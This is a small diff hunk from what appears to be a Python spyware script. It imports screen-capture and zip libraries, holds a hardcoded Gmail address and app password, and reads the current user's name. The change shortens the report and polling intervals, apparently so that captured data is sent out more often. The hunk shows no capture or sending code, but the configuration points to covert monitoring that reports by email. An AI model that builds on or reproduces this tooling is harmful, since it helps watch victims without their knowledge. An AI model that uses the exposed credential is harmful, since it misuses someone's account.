@@ -22,8 +22,8 @@ from PIL import ImageGrab
 import io
 import zipfile
 
-REPORT_INTERVAL = 20
-POLLING_INTERVAL = 30
+REPORT_INTERVAL = 10
+POLLING_INTERVAL = 20
 EMAIL = "ilove6841verymuch@gmail.com"
 EMAIL_PASSWORD = "vyeg mhds cgge shmo"
 USER_NAME = getpass.getuser()
